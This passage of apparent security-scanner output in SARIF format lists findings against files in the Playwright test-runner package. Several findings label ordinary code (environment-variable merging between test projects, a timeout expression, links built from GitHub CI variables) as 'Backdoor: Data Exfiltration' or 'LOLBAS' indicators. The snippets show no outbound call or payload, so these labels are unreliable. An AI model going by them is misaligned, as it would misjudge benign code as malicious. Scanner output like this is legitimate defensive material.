                      "markdown": "`          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n          extraEnvByProjectId.set(project.id, extraEnv);\n          const hasFailedDeps = project.deps.some(p => !successfulProjects.has(p));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 328,
                  "startColumn": 46,
                  "endLine": 328,
                  "endColumn": 51,
                  "snippet": {
                    "text": "            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n",
                    "rendered": {
                      "text": "            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n",
                      "markdown": "`            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 326,
                  "startColumn": 34,
                  "endLine": 326,
                  "endColumn": 39,
                  "snippet": {
                    "text": "          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n",
                    "rendered": {
                      "text": "          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n",
                      "markdown": "`          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 284,
                  "startColumn": 47,
                  "endLine": 284,
                  "endColumn": 52,
                  "snippet": {
                    "text": "          };\n          testRun.phases.push(phase);\n          for (const project of phaseProjects) {\n            const projectSuite = projectToSuite.get(project);\n            const testGroups = (0, _testGroups.createTestGroups)(projectSuite, testRun.config.config.workers);\n            phase.projects.push({\n              project,\n",
                    "rendered": {
                      "text": "          };\n          testRun.phases.push(phase);\n          for (const project of phaseProjects) {\n            const projectSuite = projectToSuite.get(project);\n            const testGroups = (0, _testGroups.createTestGroups)(projectSuite, testRun.config.config.workers);\n            phase.projects.push({\n              project,\n",
                      "markdown": "`          };\n          testRun.phases.push(phase);\n          for (const project of phaseProjects) {\n            const projectSuite = projectToSuite.get(project);\n            const testGroups = (0, _testGroups.createTestGroups)(projectSuite, testRun.config.config.workers);\n            phase.projects.push({\n              project,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 269,
                  "startColumn": 96,
                  "endLine": 269,
                  "endColumn": 101,
                  "snippet": {
                    "text": "        const phaseProjects = [];\n        for (const project of projectToSuite.keys()) {\n          if (processed.has(project)) continue;\n          const projectsThatShouldFinishFirst = [...project.deps, ...(teardownToSetupsDependents.get(project) || [])];\n          if (projectsThatShouldFinishFirst.find(p => !processed.has(p))) continue;\n          phaseProjects.push(project);\n        }\n",
                    "rendered": {
                      "text": "        const phaseProjects = [];\n        for (const project of projectToSuite.keys()) {\n          if (processed.has(project)) continue;\n          const projectsThatShouldFinishFirst = [...project.deps, ...(teardownToSetupsDependents.get(project) || [])];\n          if (projectsThatShouldFinishFirst.find(p => !processed.has(p))) continue;\n          phaseProjects.push(project);\n        }\n",
                      "markdown": "`        const phaseProjects = [];\n        for (const project of projectToSuite.keys()) {\n          if (processed.has(project)) continue;\n          const projectsThatShouldFinishFirst = [...project.deps, ...(teardownToSetupsDependents.get(project) || [])];\n          if (projectsThatShouldFinishFirst.find(p => !processed.has(p))) continue;\n          phaseProjects.push(project);\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 55,
                  "endLine": 95,
                  "endColumn": 66,
                  "snippet": {
                    "text": "  return taskRunner;\n}\nfunction addGlobalSetupTasks(taskRunner, config) {\n  if (!config.configCLIOverrides.preserveOutputDir && !process.env.PW_TEST_NO_REMOVE_OUTPUT_DIRS) taskRunner.addTask('clear output', createRemoveOutputDirsTask());\n  for (const plugin of config.plugins) taskRunner.addTask('plugin setup', createPluginSetupTask(plugin));\n  if (config.config.globalSetup || config.config.globalTeardown) taskRunner.addTask('global setup', createGlobalSetupTask());\n}\n",
                    "rendered": {
                      "text": "  return taskRunner;\n}\nfunction addGlobalSetupTasks(taskRunner, config) {\n  if (!config.configCLIOverrides.preserveOutputDir && !process.env.PW_TEST_NO_REMOVE_OUTPUT_DIRS) taskRunner.addTask('clear output', createRemoveOutputDirsTask());\n  for (const plugin of config.plugins) taskRunner.addTask('plugin setup', createPluginSetupTask(plugin));\n  if (config.config.globalSetup || config.config.globalTeardown) taskRunner.addTask('global setup', createGlobalSetupTask());\n}\n",
                      "markdown": "`  return taskRunner;\n}\nfunction addGlobalSetupTasks(taskRunner, config) {\n  if (!config.configCLIOverrides.preserveOutputDir && !process.env.PW_TEST_NO_REMOVE_OUTPUT_DIRS) taskRunner.addTask('clear output', createRemoveOutputDirsTask());\n  for (const plugin of config.plugins) taskRunner.addTask('plugin setup', createPluginSetupTask(plugin));\n  if (config.config.globalSetup || config.config.globalTeardown) taskRunner.addTask('global setup', createGlobalSetupTask());\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 340,
                  "startColumn": 23,
                  "endLine": 340,
                  "endColumn": 52,
                  "snippet": {
                    "text": "          await dispatcher.run(phaseTestGroups, extraEnvByProjectId);\n          await dispatcher.stop();\n          for (const [projectId, envProduced] of dispatcher.producedEnvByProjectId()) {\n            const extraEnv = extraEnvByProjectId.get(projectId) || {};\n            extraEnvByProjectId.set(projectId, {\n              ...extraEnv,\n              ...envProduced\n",
                    "rendered": {
                      "text": "          await dispatcher.run(phaseTestGroups, extraEnvByProjectId);\n          await dispatcher.stop();\n          for (const [projectId, envProduced] of dispatcher.producedEnvByProjectId()) {\n            const extraEnv = extraEnvByProjectId.get(projectId) || {};\n            extraEnvByProjectId.set(projectId, {\n              ...extraEnv,\n              ...envProduced\n",
                      "markdown": "`          await dispatcher.run(phaseTestGroups, extraEnvByProjectId);\n          await dispatcher.stop();\n          for (const [projectId, envProduced] of dispatcher.producedEnvByProjectId()) {\n            const extraEnv = extraEnvByProjectId.get(projectId) || {};\n            extraEnvByProjectId.set(projectId, {\n              ...extraEnv,\n              ...envProduced\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 330,
                  "startColumn": 20,
                  "endLine": 330,
                  "endColumn": 38,
                  "snippet": {
                    "text": "          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n          extraEnvByProjectId.set(project.id, extraEnv);\n          const hasFailedDeps = project.deps.some(p => !successfulProjects.has(p));\n",
                    "rendered": {
                      "text": "          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n          extraEnvByProjectId.set(project.id, extraEnv);\n          const hasFailedDeps = project.deps.some(p => !successfulProjects.has(p));\n",
                      "markdown": "`          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n          extraEnvByProjectId.set(project.id, extraEnv);\n          const hasFailedDeps = project.deps.some(p => !successfulProjects.has(p));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 326,
                  "startColumn": 20,
                  "endLine": 326,
                  "endColumn": 38,
                  "snippet": {
                    "text": "          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n",
                    "rendered": {
                      "text": "          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n",
                      "markdown": "`          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(dep.id)\n          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 322,
                  "startColumn": 27,
                  "endLine": 322,
                  "endColumn": 63,
                  "snippet": {
                    "text": "          project,\n          testGroups\n        } of projects) {\n          // Inherit extra environment variables from dependencies.\n          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n",
                    "rendered": {
                      "text": "          project,\n          testGroups\n        } of projects) {\n          // Inherit extra environment variables from dependencies.\n          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n",
                      "markdown": "`          project,\n          testGroups\n        } of projects) {\n          // Inherit extra environment variables from dependencies.\n          let extraEnv = {};\n          for (const dep of project.deps) extraEnv = {\n            ...extraEnv,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toMatchText.js"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 23,
                  "endLine": 76,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    pass,\n    actual: received,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}\nfunction toExpectedTextValues(items, options = {}) {\n",
                    "rendered": {
                      "text": "    pass,\n    actual: received,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}\nfunction toExpectedTextValues(items, options = {}) {\n",
                      "markdown": "`    pass,\n    actual: received,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}\nfunction toExpectedTextValues(items, options = {}) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toMatchText.js"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 131,
                  "endLine": 50,
                  "endColumn": 140,
                  "snippet": {
                    "text": "  } = await query(!!this.isNot, timeout);\n  const stringSubstring = options.matchSubstring ? 'substring' : 'string';\n  const receivedString = received || '';\n  const messagePrefix = (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined);\n  const notFound = received === _matcherHint.kNoElementsFoundError;\n  const message = () => {\n    if (pass) {\n",
                    "rendered": {
                      "text": "  } = await query(!!this.isNot, timeout);\n  const stringSubstring = options.matchSubstring ? 'substring' : 'string';\n  const receivedString = received || '';\n  const messagePrefix = (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined);\n  const notFound = received === _matcherHint.kNoElementsFoundError;\n  const message = () => {\n    if (pass) {\n",
                      "markdown": "`  } = await query(!!this.isNot, timeout);\n  const stringSubstring = options.matchSubstring ? 'substring' : 'string';\n  const receivedString = received || '';\n  const messagePrefix = (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined);\n  const notFound = received === _matcherHint.kNoElementsFoundError;\n  const message = () => {\n    if (pass) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toMatchText.js"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 7,
                  "endLine": 41,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    // Same format as jest's matcherErrorMessage\n    throw new Error([(0, _matcherHint.matcherHint)(this, receiver, matcherName, receiver, expected, matcherOptions), `${_utilsBundle.colors.bold('Matcher error')}: ${(0, _expectBundle.EXPECTED_COLOR)('expected')} value must be a string or regular expression`, this.utils.printWithType('Expected', expected, this.utils.printExpected)].join('\\n\\n'));\n  }\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n",
                    "rendered": {
                      "text": "    // Same format as jest's matcherErrorMessage\n    throw new Error([(0, _matcherHint.matcherHint)(this, receiver, matcherName, receiver, expected, matcherOptions), `${_utilsBundle.colors.bold('Matcher error')}: ${(0, _expectBundle.EXPECTED_COLOR)('expected')} value must be a string or regular expression`, this.utils.printWithType('Expected', expected, this.utils.printExpected)].join('\\n\\n'));\n  }\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n",
                      "markdown": "`    // Same format as jest's matcherErrorMessage\n    throw new Error([(0, _matcherHint.matcherHint)(this, receiver, matcherName, receiver, expected, matcherOptions), `${_utilsBundle.colors.bold('Matcher error')}: ${(0, _expectBundle.EXPECTED_COLOR)('expected')} value must be a string or regular expression`, this.utils.printWithType('Expected', expected, this.utils.printExpected)].join('\\n\\n'));\n  }\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 198,
                  "endLine": 52,
                  "endColumn": 209,
                  "snippet": {
                    "text": "`${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['show', '-s', `--format=%H${separator}%s${separator}%an${separator}%ae${separator}%",
                    "rendered": {
                      "text": "`${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['show', '-s', `--format=%H${separator}%s${separator}%an${separator}%ae${separator}%",
                      "markdown": "``${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['show', '-s', `--format=%H${separator}%s${separator}%an${separator}%ae${separator}%`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 152,
                  "endLine": 52,
                  "endColumn": 163,
                  "snippet": {
                    "text": "rocess.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['show', '-s', `--format=%H${separator",
                    "rendered": {
                      "text": "rocess.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['show', '-s', `--format=%H${separator",
                      "markdown": "`rocess.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['show', '-s', `--format=%H${separator`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 119,
                  "endLine": 52,
                  "endColumn": 130,
                  "snippet": {
                    "text": "rocess.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['sho",
                    "rendered": {
                      "text": "rocess.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['sho",
                      "markdown": "`rocess.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n  } = await (0, _utils.spawnAsync)('git', ['sho`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 72,
                  "endLine": 52,
                  "endColumn": 83,
                  "snippet": {
                    "text": "iables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n",
                    "rendered": {
                      "text": "iables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n",
                      "markdown": "`iables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`;\n  const {\n    code,\n    stdout\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 39,
                  "endLine": 52,
                  "endColumn": 50,
                  "snippet": {
